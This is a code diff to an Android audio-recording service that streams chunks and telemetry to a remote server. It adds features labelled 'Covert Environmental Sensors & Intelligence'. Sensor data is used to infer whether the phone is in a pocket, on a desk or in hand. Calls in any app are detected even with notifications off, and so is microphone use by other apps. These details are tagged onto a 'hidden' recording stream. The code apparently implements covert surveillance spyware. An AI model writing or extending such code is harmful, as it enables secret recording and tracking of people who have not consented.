@@ -8,6 +8,10 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.hardware.Sensor
+import android.hardware.SensorEvent
+import android.hardware.SensorEventListener
+import android.hardware.SensorManager
 import android.media.AudioDeviceInfo
 import android.media.AudioFormat
 import android.media.AudioManager
@@ -201,6 +205,109 @@ class AudioRecordService : Service() {
     private var lastChunkIsSpeech: Boolean = false
     private var lastChunkDb: Int = 0
 
+    // Covert Environmental Sensors & Intelligence
+    private var currentBatteryTempC: Int = 0
+    private var isDeviceMoving: Boolean = false
+    private var lastMovementTimeMs: Long = 0L
+    private var isProximityNear: Boolean = false
+    private var currentLux: Float = 100f
+    private var currentPosture: String = "OPEN" // "POCK" (Pocket/Face-down), "DESK" (Table), "OPEN" (In hand)
+
+    private var sensorManager: SensorManager? = null
+    private var proximitySensor: Sensor? = null
+    private var lightSensor: Sensor? = null
+    private var accelerometerSensor: Sensor? = null
+    private var sensorEventListener: SensorEventListener? = null
+
+    private fun registerSensors() {
+        try {
+            sensorManager = getSystemService(Context.SENSOR_SERVICE) as? SensorManager ?: return
+            proximitySensor = sensorManager?.getDefaultSensor(Sensor.TYPE_PROXIMITY)
+            lightSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_LIGHT)
+            accelerometerSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
+
+            sensorEventListener = object : SensorEventListener {
+                override fun onSensorChanged(event: SensorEvent?) {
+                    if (event == null) return
+                    when (event.sensor.type) {
+                        Sensor.TYPE_PROXIMITY -> {
+                            val distance = event.values[0]
+                            val maxRange = proximitySensor?.maximumRange ?: 5f
+                            isProximityNear = distance < maxRange.coerceAtMost(5f)
+                            updatePosture()
+                        }
+                        Sensor.TYPE_LIGHT -> {
+                            currentLux = event.values[0]
+                            updatePosture()
+                        }
+                        Sensor.TYPE_ACCELEROMETER -> {
+                            val x = event.values[0]
+                            val y = event.values[1]
+                            val z = event.values[2]
+                            val gNorm = Math.sqrt((x * x + y * y + z * z).toDouble())
+                            val delta = Math.abs(gNorm - 9.81)
+                            if (delta > 1.2) {
+                                lastMovementTimeMs = System.currentTimeMillis()
+                                isDeviceMoving = true
+                            } else if (System.currentTimeMillis() - lastMovementTimeMs > 4000) {
+                                isDeviceMoving = false
+                            }
+                            updatePosture()
+                        }
+                    }
+                }
+
+                override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
+            }
+
+            proximitySensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
+            lightSensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
+            accelerometerSensor?.let { sensorManager?.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL) }
+        } catch (e: Exception) {
+            sendLog("Sensor listener setup error: ${e.message}")
+        }
+    }
+
+    private fun updatePosture() {
+        currentPosture = when {
+            isProximityNear && currentLux < 10f -> "POCK"
+            !isProximityNear && currentLux >= 10f && !isDeviceMoving -> "DESK"
+            else -> "OPEN"
+        }
+    }
+
+    private fun unregisterSensors() {
+        try {
+            sensorEventListener?.let { sensorManager?.unregisterListener(it) }
+            sensorEventListener = null
+            sensorManager = null
+        } catch (e: Exception) {}
+    }
+
+    private fun getCallAppTag(): String {
+        // 1. Check if CallNotificationListener detected an active call notification for ANY app
+        val notifCode = CallNotificationListener.getActiveCallCode()
+        if (notifCode != "AIDLE" && notifCode.isNotEmpty()) {
+            return notifCode
+        }
+
+        // 2. Hardware AudioServer fallback (Works even if all notifications are turned off!)
+        return try {
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+            when (audioManager?.mode) {
+                AudioManager.MODE_IN_CALL -> "ACELL"
+                AudioManager.MODE_IN_COMMUNICATION -> "AVOIP"
+                else -> {
+                    if (isPhoneInCall()) "ACELL"
+                    else if (isMicUsedByExternalApp()) "AMIC"
+                    else "AIDLE"
+                }
+            }
+        } catch (e: Exception) {
+            if (isPhoneInCall()) "ACELL" else "AIDLE"
+        }
+    }
+
     private fun isScreenOn(): Boolean {
         return try {
             val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
@@ -258,6 +365,9 @@ class AudioRecordService : Service() {
 
     private fun sendLiveTelemetry() {
         val route = getCurrentAudioRoute()
+        val notifApp = CallNotificationListener.activeCallApp ?: if (isPhoneInCall()) "Cellular Call" else "Idle"
+        val notifPkg = CallNotificationListener.activeCallPkg ?: ""
+        val callCode = getCallAppTag()
         socketManager?.sendTelemetry(
             batteryPct = currentBatteryPct,
             storageMb = currentStorageMB,
@@ -267,7 +377,13 @@ class AudioRecordService : Service() {
             powerSource = currentPowerSource,
             ringerMode = getRingerMode(),
             isSpeech = lastChunkIsSpeech,
-            audioDb = lastChunkDb
+            audioDb = lastChunkDb,
+            batteryTemp = currentBatteryTempC,
+            isMoving = isDeviceMoving,
+            posture = currentPosture,
+            callApp = notifApp,
+            callPkg = notifPkg,
+            callCode = callCode
         )
     }
 
@@ -298,6 +414,9 @@ class AudioRecordService : Service() {
             else -> "CBAT"
         }
 
+        val rawTemp = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0)
+        currentBatteryTempC = if (rawTemp > 0) rawTemp / 10 else 0
+
         val icon = if (isCharging) "⚡" else "🔋"
         val stateStr = when (currentPowerSource) {
             "CUSB" -> "USB/PC Connected"
@@ -305,7 +424,8 @@ class AudioRecordService : Service() {
             "CWIR" -> "Wireless Charging"
             else -> if (isCharging) "Charging" else "Discharging"
         }
-        val batteryStatus = if (pct >= 0) "$icon $pct% ($stateStr)" else "$icon Unknown"
+        val tempStr = if (currentBatteryTempC > 0) " | ${currentBatteryTempC}°C" else ""
+        val batteryStatus = if (pct >= 0) "$icon $pct% ($stateStr)$tempStr" else "$icon Unknown"
         val newDeviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | $batteryStatus"
 
         if (newDeviceInfo != deviceInfo) {
@@ -352,6 +472,7 @@ class AudioRecordService : Service() {
 
         registerBatteryListener()
         registerScreenListener()
+        registerSensors()
 
         socketManager = DeviceSocketManager(
             serverUrl = serverUrl,
@@ -480,6 +601,8 @@ class AudioRecordService : Service() {
             screenReceiver?.let { unregisterReceiver(it) }
             screenReceiver = null
         } catch (e: Exception) { /* ignore */ }
+
+        unregisterSensors()
 
         releaseWakeLock()
         serviceScope.coroutineContext.cancelChildren()
@@ -909,7 +1032,15 @@ class AudioRecordService : Service() {
             val vTag = if (isSpeech) "V1" else "V0"
             val dbTag = "dB$positiveDb"
 
-            val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}"
+            val telemetrySuffix = if (targetStreamType == "hidden") {
+                val tTag = "T$currentBatteryTempC"
+                val mTag = if (isDeviceMoving) "M1" else "M0"
+                val pTag = "P$currentPosture"
+                val aTag = getCallAppTag()
+                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}_${tTag}_${mTag}_${pTag}_${aTag}"
+            } else {
+                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
+            }
             val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
             
             // Update timestamp to include telemetry for the server HLS generation
